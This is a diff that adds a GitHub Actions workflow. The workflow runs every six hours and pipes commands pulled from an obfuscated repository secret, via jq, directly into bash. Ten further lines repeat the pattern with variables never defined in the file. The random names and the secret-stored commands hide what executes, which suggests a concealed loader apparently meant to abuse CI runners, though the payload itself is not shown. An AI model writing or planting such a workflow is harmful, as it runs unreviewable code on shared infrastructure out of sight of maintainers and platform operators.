@@ -1,0 +1,27 @@
+name: zhaliangyy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaliangyy
+        env:
+          wuu14855: ${{ secrets.wuu14855 }}
+        run: |
+          echo $wuu14855 | jq -r .rol0 | /bin/bash
+          echo $hics08 | jq -r .s1 | /bin/bash
+          echo $jhiyf12 | jq -r .cq958 | /bin/bash
+          echo $twx77007 | jq -r .uu6 | /bin/bash
+          echo $cwu55838 | jq -r .lb44 | /bin/bash
+          echo $x145 | jq -r .ysu2891 | /bin/bash
+          echo $m87 | jq -r .z21 | /bin/bash
+          echo $f517 | jq -r .m4 | /bin/bash
+          echo $cwrk93 | jq -r .ff981 | /bin/bash
+          echo $kg874 | jq -r .qlvml7473 | /bin/bash
+          echo $h96 | jq -r .wztm6948 | /bin/bash
+
